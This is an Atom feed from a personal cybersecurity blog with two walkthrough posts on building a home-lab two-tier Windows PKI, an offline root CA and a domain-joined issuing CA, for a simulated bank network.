<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-02-07T13:14:13-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><entry><title type="html">Simulating a Banking Security Infrastructure Part 2 The Subordinate (Issuing) CA</title><link href="/blog/BankLab" rel="alternate" type="text/html" title="Simulating a Banking Security Infrastructure Part 2 The Subordinate (Issuing) CA" /><published>2026-02-06T00:00:00-05:00</published><updated>2026-02-06T00:00:00-05:00</updated><id>http://localhost:4000/blog/BankLab2</id><content type="html" xml:base="/blog/BankLab"><![CDATA[<p>This server, <code class="language-plaintext highlighter-rouge">SUBCA01</code>, is the “worker bee.” It will stay online, join the domain, and issue certificates to every user and computer in my bank.</p>

<p>This server <strong>must</strong> be able to talk to <code class="language-plaintext highlighter-rouge">DC01</code> to join the domain.</p>

<p><strong>1. Rename the Server</strong></p>

<ul>
  <li>
    <p>Rename to: <strong><code class="language-plaintext highlighter-rouge">SUBCA01</code></strong></p>
  </li>
  <li>
    <p><em>Restart required.</em></p>
  </li>
</ul>

<p><strong>2. Configure Static IP</strong></p>

<ul>
  <li>
    <p><strong>IP Address:</strong> <code class="language-plaintext highlighter-rouge">192.168.10.20</code></p>
  </li>
  <li>
    <p><strong>Subnet Mask:</strong> <code class="language-plaintext highlighter-rouge">255.255.255.0</code></p>
  </li>
  <li>
    <p><strong>Default Gateway:</strong> <code class="language-plaintext highlighter-rouge">192.168.10.1</code></p>
  </li>
  <li>
    <p><strong>Preferred DNS:</strong> <code class="language-plaintext highlighter-rouge">192.168.10.10</code></p>
  </li>
</ul>

<h4 id="join-the-domain">Join the Domain</h4>

<p>Once the IP is set, let’s connect it to the bank network.</p>

<ol>
  <li>
    <p>Right-click <strong>Start</strong> &gt; <strong>System</strong>.</p>
  </li>
  <li>
    <p>Click <strong>Rename this PC (advanced)</strong>.</p>
  </li>
  <li>
    <p>Click <strong>Change…</strong></p>
  </li>
  <li>
    <p><strong>Member of Domain:</strong> <code class="language-plaintext highlighter-rouge">bank.lab</code></p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*m2TRPUE6KX2ycMTe_esacw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li>
    <p><strong>Credentials:</strong></p>

    <ul>
      <li>
        <p>User: <code class="language-plaintext highlighter-rouge">Administrator</code></p>
      </li>
      <li>
        <p>Pass: <code class="language-plaintext highlighter-rouge">BankLab1!</code></p>
      </li>
    </ul>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*op73yHPJVdsdMUoASEG7zQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li><strong>Success:</strong> You should see “Welcome to the bank.lab domain.”</li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rSQI9Wsb1rb87ITyhUmCyQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li><strong>Restart</strong> the server.</li>
</ol>

<h4 id="install-the-role-software">Install the Role Software</h4>

<ul>
  <li>
    <p>Log into <strong>SUBCA01</strong> as <strong><code class="language-plaintext highlighter-rouge">BANK\Administrator</code></strong>.</p>

    <ul>
      <li>
        <p>Open <strong>Server Manager</strong>.</p>
      </li>
      <li>
        <p>Click <strong>Manage</strong> &gt; <strong>Add Roles and Features</strong>.</p>
      </li>
      <li>
        <p>Click <strong>Next</strong> until you reach <strong>Server Roles</strong>.</p>
      </li>
      <li>
        <p>Check <strong>Active Directory Certificate Services</strong>. (Click “Add Features” when prompted).</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*uDrk6Br8yIj6otjldKzxdg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

    <ul>
      <li>
        <p>On the <strong>Role Services</strong> screen, check <strong>two</strong> boxes this time:</p>
      </li>
      <li>
        <p><strong>Certification Authority</strong></p>
      </li>
      <li>
        <p><strong>Certification Authority Web Enrollment</strong> (This allows users to request certificates via a web browser later).
<img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*jiUZf6B_ei8PDH90i1y7jw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
        <ul>
          <li>Click <strong>Next</strong> through the rest and then <strong>Install</strong>.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*OWXHAUMsLs3MGnAFVDa3rw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="configure-the-subordinate-ca">Configure the Subordinate CA</h4>

<p>Once the install is done, click that <strong>Yellow Flag ** and click the **Configure</strong> link.</p>

<ol>
  <li>
    <p><strong>Credentials:</strong> <code class="language-plaintext highlighter-rouge">BANK\Administrator</code> -&gt; <strong>Next</strong>.</p>
  </li>
  <li>
    <p><strong>Role Services:</strong> Check <strong>both</strong> boxes (CA and Web Enrollment) -&gt; <strong>Next</strong>.</p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DFZiRCVIjmOsEBF0V2gHxQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li>
    <p><strong>Setup Type:</strong></p>

    <ul>
      <li>
        <p>Select <strong>Enterprise CA</strong>.</p>
      </li>
      <li>
        <p><em>Why?</em> Because this server is part of the domain and will use Active Directory to manage certificates.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*IEdVhv2RDMwMwS-ZXtmBnA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
  </li>
  <li>
    <p><strong>CA Type:</strong></p>

    <ul>
      <li>
        <p>Select <strong>Subordinate CA</strong>.</p>
      </li>
      <li>
        <p><em>Why?</em> Because <code class="language-plaintext highlighter-rouge">Bank Root CA</code> is the boss, and this server works for it.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*uYf1_Y8h1oA3NPjnwtRPRg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
  </li>
  <li>
    <p><strong>Private Key:</strong> <strong>Create a new private key</strong> -&gt; <strong>Next</strong>.</p>
  </li>
  <li>
    <p><strong>Cryptography:</strong></p>

    <ul>
      <li>
        <p><strong>Key Length:</strong> <code class="language-plaintext highlighter-rouge">2048</code>. (Subordinate CAs usually use 2048 while the Root uses 4096).</p>
      </li>
      <li>
        <p><strong>Hash:</strong> <code class="language-plaintext highlighter-rouge">SHA256</code>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MPVTplkWunBWPh9gQtlI5Q.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
  </li>
  <li>
    <p><strong>CA Name:</strong></p>

    <ul>
      <li><strong>Common Name:</strong> Change to <strong><code class="language-plaintext highlighter-rouge">Bank Issuing CA</code></strong>.</li>
    </ul>
  </li>
  <li>
    <p><strong>Certificate Request:</strong></p>

    <ul>
      <li>
        <p>Select <strong>Save a certificate request to a file on the target machine</strong>.</p>
      </li>
      <li>
        <p>Note the location (usually <code class="language-plaintext highlighter-rouge">C:\</code>). This is the “ID Application” we have to take to the Root CA to get signed.</p>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Confirmation:</strong> Click <strong>Configure</strong>.</p>
  </li>
</ol>

<p>At the end, the wizard will say it succeeded, but it will also give you a warning: <code class="language-plaintext highlighter-rouge">The Certification Authority is not started because the certificate is not yet installed.</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*hH_o91Nj1bVTCTeXeMtwTw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>That message is exactly what we were expecting! It confirms that your Subordinate CA has successfully generated its “application” (the .req file) and is now waiting for the Root CA to approve it.</p>

<p>As the message says, the installation is incomplete because it won’t start until it has a valid certificate from its parent.</p>

<p><strong>1. Locate the Request File</strong></p>

<ul>
  <li>
    <p>Go to the <strong>C: drive</strong> on <strong>SUBCA01</strong>.</p>
  </li>
  <li>
    <p>You should see the file: <code class="language-plaintext highlighter-rouge">SUBCA01.bank.lab_bank-SUBCA01-CA.req</code>.</p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bJxScyL04CN3Hbsl5GkfQA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>2. Move it to the Staging Area</strong></p>

<ul>
  <li>
    <p>Copy that <code class="language-plaintext highlighter-rouge">.req</code> file.</p>
  </li>
  <li>
    <p>Paste it into the <code class="language-plaintext highlighter-rouge">C:\PKI</code> folder on your <strong>DC01</strong> (your “bridge” server).</p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*C37ACyf_8-Q8CiV3V1d82g.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>3. Bring the Root CA Online</strong></p>

<ul>
  <li>
    <p>Power on your <strong>ROOTCA01</strong> VM.</p>
  </li>
  <li>
    <p>Log in as the local <strong>Administrator</strong>.</p>
  </li>
</ul>

<p><strong>4. Pull the Request onto the Root CA</strong></p>

<ul>
  <li>
    <p>On <strong>ROOTCA01</strong>, open File Explorer.</p>
  </li>
  <li>
    <p>In the address bar, type <code class="language-plaintext highlighter-rouge">\\192.168.10.10\c$\PKI</code> and press Enter.</p>
  </li>
  <li>
    <p>Copy the <code class="language-plaintext highlighter-rouge">.req</code> file from the DC and paste it onto the <strong>Root CA’s local C: drive</strong>.</p>
  </li>
</ul>

<blockquote>
  <p>“Note: In a real banking environment, you would use a USB drive to transfer these files. For this lab simulation, I temporarily connected the Root CA to the network.</p>
</blockquote>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9VhxS30ioTXYcyxhjVyiOA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>5. Submit the Request</strong></p>

<ul>
  <li>
    <p>Open the <strong>Certification Authority</strong> console on the Root CA.</p>
  </li>
  <li>
    <p>Right-click the CA Name (Bank Root CA).</p>
  </li>
  <li>
    <p>Select <strong>All Tasks</strong> &gt; <strong>Submit new request…</strong></p>
  </li>
  <li>
    <p>Navigate to the <code class="language-plaintext highlighter-rouge">C:\</code> drive and select the <code class="language-plaintext highlighter-rouge">.req</code> file you just copied.</p>
  </li>
  <li>
    <p><em>Now</em> the certificate will appear in the <strong>Issued Certificates</strong> folder.</p>
  </li>
</ul>

<h4 id="export-the-issued-certificate-on-rootca01">Export the Issued Certificate (On ROOTCA01)</h4>

<ul>
  <li>
    <p>Click on the <strong>Issued Certificates</strong> folder in the left pane.</p>

    <ul>
      <li>
        <p>Double-click the certificate that was just created (it should say <strong>Bank Issuing CA</strong>).</p>
      </li>
      <li>
        <p>Click the <strong>Details</strong> tab.</p>
      </li>
      <li>
        <p>Click <strong>Copy to File…</strong></p>
      </li>
      <li>
        <p>Follow the <strong>Certificate Export Wizard</strong>:</p>
      </li>
      <li>
        <p><strong>Welcome:</strong> Click <strong>Next</strong>.</p>
      </li>
      <li>
        <p><strong>Export File Format:</strong> Keep the default (<strong>DER encoded binary X.509 (.CER)</strong>). Click <strong>Next</strong>.</p>
      </li>
      <li>
        <p><strong>File to Export:</strong> Save it to your <strong>C:</strong> drive as <code class="language-plaintext highlighter-rouge">BankIssuingCA.cer</code>.</p>
      </li>
      <li>
        <p><strong>Completing:</strong> Click <strong>Finish</strong>.</p>
      </li>
    </ul>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*RvgASY7UOfsaTRZNEjFpqA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="final-handover">Final Handover</h4>

<p>Now we move the file back across the “bridge” (the DC).</p>

<ol>
  <li>
    <p>On <strong>ROOTCA01</strong>, open File Explorer.</p>
  </li>
  <li>
    <p>Copy <code class="language-plaintext highlighter-rouge">C:\BankIssuingCA.cer</code>.</p>
  </li>
  <li>
    <p>In the address bar, type <code class="language-plaintext highlighter-rouge">\\192.168.10.10\c$\PKI</code> and press <strong>Enter</strong>.</p>
  </li>
  <li>
    <p><strong>Paste</strong> the file into the PKI folder on the DC.</p>
  </li>
  <li>
    <p><strong>Don’t Forget the CRL!</strong></p>
  </li>
</ol>

<ul>
  <li>
    <p>While on the Root CA, go to <code class="language-plaintext highlighter-rouge">C:\Windows\System32\CertSrv\CertEnroll</code>.</p>
  </li>
  <li>
    <p>Copy the file ending in <code class="language-plaintext highlighter-rouge">.crl</code> (e.g., <code class="language-plaintext highlighter-rouge">Bank Root CA.crl</code>).</p>
  </li>
  <li>
    <p>Paste this into the PKI folder on the DC along with the <code class="language-plaintext highlighter-rouge">.cer</code> file.</p>
  </li>
</ul>

<ol>
  <li><strong>Shutdown ROOTCA01</strong></li>
</ol>

<h4 id="install-the-certificate-on-subca01">Install the Certificate (On SUBCA01)</h4>

<p>This is the moment where <strong>SUBCA01</strong> finally becomes active.</p>

<ol>
  <li>
    <p>Log into <strong>SUBCA01</strong>.</p>
  </li>
  <li>
    <p>Go to <code class="language-plaintext highlighter-rouge">\\192.168.10.10\c$\PKI</code> and copy <code class="language-plaintext highlighter-rouge">BankIssuingCA.cer</code> to your local <strong>C:</strong> drive.</p>
  </li>
  <li>
    <p>Open the <strong>Certification Authority</strong> console (<strong>Tools</strong> &gt; <strong>Certification Authority</strong>).</p>
  </li>
  <li>
    <p>Right-click <strong>Bank Issuing CA</strong> (it will currently have a red “stopped” icon).</p>
  </li>
  <li>
    <p>Select <strong>All Tasks</strong> &gt; <strong>Install CA Certificate…</strong></p>
  </li>
  <li>
    <p>Select the <code class="language-plaintext highlighter-rouge">C:\BankIssuingCA.cer</code> file and click <strong>Open</strong>.</p>
  </li>
</ol>

<p><strong>Publish the Root CRL:</strong></p>

<ul>
  <li>
    <p>On <strong>SUBCA01</strong>, copy the <code class="language-plaintext highlighter-rouge">.crl</code> file you brought over.</p>
  </li>
  <li>
    <p>Open a Command Prompt as Administrator.</p>
  </li>
  <li>
    <p>Run: <code class="language-plaintext highlighter-rouge">certutil -addstore -f Root "C:\Bank Root CA.crl"</code></p>
  </li>
  <li>
    <p><em>(This manually teaches the Subordinate CA that the Root is valid, helping the service start).</em></p>
  </li>
</ul>

<h4 id="start-the-service">Start the Service</h4>

<ol>
  <li>
    <p>In the Certification Authority console, right-click <strong>Bank Issuing CA</strong>.</p>
  </li>
  <li>
    <p>Select <strong>All Tasks</strong> &gt; <strong>Start Service</strong>.</p>
  </li>
</ol>

<h3 id="resume">Resume:</h3>

<p>With the Root CA secured offline, I shifted focus to the <strong>Issuing CA</strong> (<code class="language-plaintext highlighter-rouge">SUBCA01</code>). This is the server that remains online to handle day-to-day certificate requests from users and computers.</p>

<p><strong>1. Domain Integration</strong> Unlike the Root, the Subordinate CA was joined to the <code class="language-plaintext highlighter-rouge">bank.lab</code> domain. This allows it to use <strong>Active Directory Certificate Services (AD CS)</strong> in <strong>Enterprise</strong> mode, enabling automated certificate enrollment for domain members.</p>

<p><strong>2. The Installation &amp; Web Enrollment</strong> I installed the <strong>Certification Authority</strong> and <strong>Certification Authority Web Enrollment</strong> roles. Adding Web Enrollment provides a user-friendly interface for requesting certificates via a browser (e.g., <code class="language-plaintext highlighter-rouge">http://subca01.bank.lab/certsrv</code>).</p>

<p><strong>3. The Signing Ceremony (The Handover)</strong> Because a Subordinate CA cannot trust itself, I had to generate a Certificate Request (<code class="language-plaintext highlighter-rouge">.req</code>) and perform a “Signing Ceremony”:</p>

<ul>
  <li>
    <p><strong>Export:</strong> Transferred the request from the online Subordinate to the offline Root.</p>
  </li>
  <li>
    <p><strong>Sign:</strong> Powered on the Root CA, submitted the request, and officially <strong>Issued</strong> the certificate.</p>
  </li>
  <li>
    <p><strong>Import:</strong> Brought the signed certificate (<code class="language-plaintext highlighter-rouge">.cer</code>) back to the Subordinate CA.</p>
  </li>
</ul>

<p><strong>4. Activation</strong> Upon importing the signed certificate, the <strong>Bank Issuing CA</strong> service was started. The transition from a “Stopped” state to a <strong>Green Checkmark</strong> verified that the chain of trust was successfully established from the Offline Root down to the Issuing CA.</p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="walkthrough" /><summary type="html"><![CDATA[<p>This server, <code class="language-plaintext highlighter-rouge">SUBCA01</code>, is the “worker bee.” It will stay online, join the domain, and issue certificates to every user and computer in my bank.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*JXgOF-w_gIDA7L2EAXP7iw.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*JXgOF-w_gIDA7L2EAXP7iw.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Simulating a Banking Security Infrastructure Part 1</title><link href="/blog/BankLab" rel="alternate" type="text/html" title="Simulating a Banking Security Infrastructure Part 1" /><published>2026-02-06T00:00:00-05:00</published><updated>2026-02-06T00:00:00-05:00</updated><id>http://localhost:4000/blog/BankLab</id><content type="html" xml:base="/blog/BankLab"><![CDATA[<p>For my latest home lab project, I am building a Two-Tier Public Key Infrastructure (PKI) to simulate a high-security banking environment.</p>

<p>Today, I established the “Trust Anchor” of the entire network: the Standalone Offline Root CA.</p>

<h4 id="the-architecture-strategy">The Architecture Strategy</h4>

<p>I designed this Root CA with specific security constraints:</p>

<ul>
  <li>
    <p><strong>Offline Status:</strong> It is not joined to the domain. In a real production environment, this server would be physically unplugged (air-gapped) to protect the private keys from network attacks.</p>
  </li>
  <li>
    <p><strong>Standalone Mode:</strong> Since it has no AD dependency, it acts purely as the source of truth for the hierarchy.</p>
  </li>
</ul>

<h4 id="installing-the-core-role">Installing the Core Role</h4>

<p>I started with a fresh installation of Windows Server 2025 (Server Core is preferred for production, but I used Desktop Experience to visualize the management tools).</p>

<p>Using Server Manager, I deployed the Active Directory Certificate Services (AD CS) role. At this stage, the server is just waiting to be told what kind of Authority it will be.</p>

<h4 id="configuration-install-the-role-software">Configuration Install the Role Software</h4>

<p>We will use Server Manager for this so you can see exactly what is happening.</p>

<ul>
  <li>
    <p>Open <strong>Server Manager</strong>.</p>

    <ul>
      <li>
        <p>Click <strong>Manage</strong> (top right) &gt; <strong>Add Roles and Features</strong>.</p>
      </li>
      <li>
        <p>Click <strong>Next</strong> until you reach <strong>Server Roles</strong>.</p>
      </li>
      <li>
        <p>Check the box for <strong>Active Directory Certificate Services</strong>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*_DObGN7LEyfK7aaEJSOKyg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

    <ul>
      <li>
        <p><em>Click “Add Features” when the popup appears.</em></p>

        <ul>
          <li>Click <strong>Next</strong> through the rest of the wizard.</li>
        </ul>
      </li>
      <li>
        <p>On the <strong>Role Services</strong> screen, ensure only <strong>Certification Authority</strong> is checked.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Ar2UKyM0qNXCSGerxmTSMg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

    <ul>
      <li>Click <strong>Install</strong>.</li>
    </ul>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*GB9PGKrAiufM3kbkD0C7Rw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Once the installation bar finishes, you will see a **Yellow Flag ** notification at the top of Server Manager.</p>

<ol>
  <li>
    <p>Click the <strong>Yellow Flag</strong>.</p>
  </li>
  <li>
    <p>Click the blue link: <strong>“Configure Active Directory Certificate Services on the destination server”</strong>.</p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Md9_ismxk6-GIH_OdNNpZA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>follow this “Bank Security” configuration profile exactly:</p>

<ol>
  <li>
    <p><strong>Credentials:</strong> Just click <strong>Next</strong> (using local Administrator).</p>
  </li>
  <li>
    <p><strong>Role Services:</strong> Check <strong>Certification Authority</strong> &gt; <strong>Next</strong>.</p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bAlibbB13v8koy1McEdmTQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li>
    <p><strong>Setup Type:</strong></p>

    <ul>
      <li>
        <p>Select <strong>Standalone CA</strong>.</p>
      </li>
      <li>
        <p><em>Why?</em> Because this server is NOT in the domain. It is an offline island.</p>
      </li>
      <li>
        <p>Click <strong>Next</strong>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a_bz1RCNH9b8l2fz2ygdLA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
  </li>
  <li>
    <p><strong>CA Type:</strong> Select <strong>Root CA</strong> &gt; <strong>Next</strong>.</p>
  </li>
  <li>
    <p><strong>Private Key:</strong> Select <strong>Create a new private key</strong> &gt; <strong>Next</strong>.</p>
  </li>
  <li>
    <p><strong>Cryptography:</strong></p>

    <ul>
      <li>
        <p><strong>Key length:</strong> Change <code class="language-plaintext highlighter-rouge">2048</code> to <strong><code class="language-plaintext highlighter-rouge">4096</code></strong>. (We want this key to be unbreakable).</p>
      </li>
      <li>
        <p><strong>Hash algorithm:</strong> SHA256 (Standard).</p>
      </li>
      <li>
        <p>Click <strong>Next</strong>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*I7qfMqS5WXzcSNie4odQHA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
  </li>
  <li>
    <p><strong>CA Name:</strong></p>

    <ul>
      <li>
        <p><strong>Common name:</strong> Change this to <strong><code class="language-plaintext highlighter-rouge">Bank Root CA</code></strong>.</p>
      </li>
      <li>
        <p><em>This is the name users will see in their certificates.</em></p>
      </li>
      <li>
        <p>Click <strong>Next</strong>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8s9WaZmYwNganzp4R5dHUw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
  </li>
  <li>
    <p><strong>Validity Period:</strong></p>

    <ul>
      <li>
        <p>Change <code class="language-plaintext highlighter-rouge">5 Years</code> to <strong><code class="language-plaintext highlighter-rouge">20 Years</code></strong>.</p>
      </li>
      <li>
        <p><em>Why?</em> Root CAs are a pain to replace. You want this to last a long time.</p>
      </li>
      <li>
        <p>Click <strong>Next</strong>.</p>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Database:</strong> Leave defaults &gt; <strong>Next</strong>.</p>
  </li>
  <li>
    <p><strong>Confirmation:</strong> Click <strong>Configure</strong>.</p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dUV3bQmOu9Y3FZynQLzv8w.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>To verify your new Root CA is alive:</p>

<ol>
  <li>
    <p>Click <strong>Tools</strong> (top right of Server Manager).</p>
  </li>
  <li>
    <p>Select <strong>Certification Authority</strong>.</p>
  </li>
  <li>
    <p>You should see a green checkmark next to <strong>Bank Root CA</strong>.</p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*XJVK4wDSyH0j0aMLLrPP0Q.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*jUZfGCTEGrv18NW-YthlJQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="configure-cdp-and-aia-extensions">Configure CDP and AIA Extensions</h4>

<p><strong> Open Properties</strong></p>

<ul>
  <li>
    <p>Right-click <strong>Bank Root CA</strong> (in the Certification Authority console).</p>
  </li>
  <li>
    <p>Select <strong>Properties</strong>.</p>
  </li>
  <li>
    <p>Click the <strong>Extensions</strong> tab.</p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Aur__CQd3tXX-Tg7lIuV2A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="configure-cdp-crl-distribution-point">Configure CDP (CRL Distribution Point)</h4>

<p><em>Ensure <code class="language-plaintext highlighter-rouge">Select extension:</code> is set to <strong>CRL Distribution Point (CDP)</strong>.</em></p>

<ol>
  <li>
    <p><strong>Clean up:</strong> Remove all the existing entries <strong>EXCEPT</strong> the one that starts with <code class="language-plaintext highlighter-rouge">C:\Windows\System32...</code>. (Keep that one it’s where the file is created locally).</p>

    <ul>
      <li><em>Select an entry -&gt; Click Remove -&gt; Yes.</em></li>
    </ul>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*BUWH1JD0z1KhMT-OZtvJhA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ul>
  <li>
    <p><strong>Add the “Future” Web Path:</strong></p>

    <ul>
      <li>
        <p>Click <strong>Add…</strong></p>
      </li>
      <li>
        <p>In the bottom box, type this <strong>exact</strong> URL (Case sensitive!): <code class="language-plaintext highlighter-rouge">http://pki.bank.lab/CertEnroll/&lt;CaName&gt;&lt;CRLNameSuffix&gt;&lt;DeltaCRLAllowed&gt;.crl</code></p>
      </li>
      <li>
        <blockquote>
          <p><em>Tip: You can type the <code class="language-plaintext highlighter-rouge">http://...</code> part and then use the “Insert” button to add the <code class="language-plaintext highlighter-rouge">&lt;variables&gt;</code>. Or just copy-paste carefully.</em></p>
        </blockquote>
      </li>
      <li>
        <p>Click <strong>OK</strong>.</p>

        <ul>
          <li><strong>Set Permissions (Crucial):</strong></li>
        </ul>
      </li>
      <li>
        <p>Highlight the new HTTP URL you just added.</p>
      </li>
      <li>
        <p>Check these two boxes at the bottom:</p>

        <ul>
          <li>
            <p><strong>Include in the CDP extension of issued certificates</strong></p>
          </li>
          <li>
            <p><strong>Include in CRLs. Clients use this to find Delta CRL locations</strong></p>
          </li>
        </ul>
      </li>
      <li><em>Uncheck everything else for this HTTP path.</em></li>
    </ul>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*hvBeVpGuizXCoBXBO71YFQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="configure-aia-authority-information-access">Configure AIA (Authority Information Access)</h4>

<p><em>Change <code class="language-plaintext highlighter-rouge">Select extension:</code> to <strong>Authority Information Access (AIA)</strong>.</em></p>

<ol>
  <li><strong>Clean up:</strong> Remove all entries <strong>EXCEPT</strong> the <code class="language-plaintext highlighter-rouge">C:\Windows\System32...</code> one.</li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ZUDsAzq0APrh6ZBtOrycJg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li>
    <p><strong>Add the Web Path:</strong></p>

    <ul>
      <li>
        <p>Click <strong>Add…</strong></p>
      </li>
      <li>
        <p>Type this exact URL: <code class="language-plaintext highlighter-rouge">http://pki.bank.lab/CertEnroll/&lt;ServerDNSName&gt;_&lt;CaName&gt;&lt;CertificateName&gt;.crt</code></p>
      </li>
      <li>
        <p>Click <strong>OK</strong>.</p>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Set Permissions:</strong></p>

    <ul>
      <li>
        <p>Highlight the new HTTP URL.</p>
      </li>
      <li>
        <p>Check this box:</p>

        <ul>
          <li><strong>Include in the AIA extension of issued certificates</strong></li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

